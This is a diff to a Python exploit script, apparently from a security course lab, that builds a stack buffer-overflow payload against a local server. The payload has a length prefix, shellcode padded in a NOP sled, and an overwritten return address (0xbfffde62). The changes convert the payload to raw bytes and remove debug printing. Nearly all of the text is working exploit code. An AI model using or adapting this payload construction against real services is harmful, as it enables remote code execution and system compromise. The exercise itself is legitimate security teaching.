@@ -7,7 +7,7 @@ from infosec.core import assemble
 HOST = '127.0.0.1'
 SERVER_PORT = 8000
 LOCAL_PORT = 1337
-NOP = '\x90'
+NOP = '\x90'.encode('latin1')
 
 PATH_TO_SHELLCODE = './shellcode.asm'
 
@@ -61,16 +61,11 @@ def get_payload() -> bytes:
     Returns:
          The bytes of the payload.
     """
-    shellcode_decoded = get_shellcode().decode('latin1')
+    shellcode_decoded = get_shellcode()
     size = network_order_uint32(1040 + 4 + 1)
-    size_decoded = size.decode('latin1')
     patched_ret_addr = struct.pack('<I', 0xbfffde62)
-    patched_ret_addr_decoded = patched_ret_addr.decode('latin1')
-    payload = size_decoded + shellcode_decoded.rjust(1040, NOP) + patched_ret_addr_decoded + "\x00"
-    print(f"len: {len(payload)}")
-    print(f"latin trash: {payload}")
-    print(f"bytes: {payload.encode('latin1')}")
-    return payload.encode('latin1')
+    payload = size + shellcode_decoded.rjust(1040, NOP) + patched_ret_addr + "\x00".encode('latin1')
+    return payload
 
 def network_order_uint32(value) -> bytes:
     return struct.pack('>L', value)
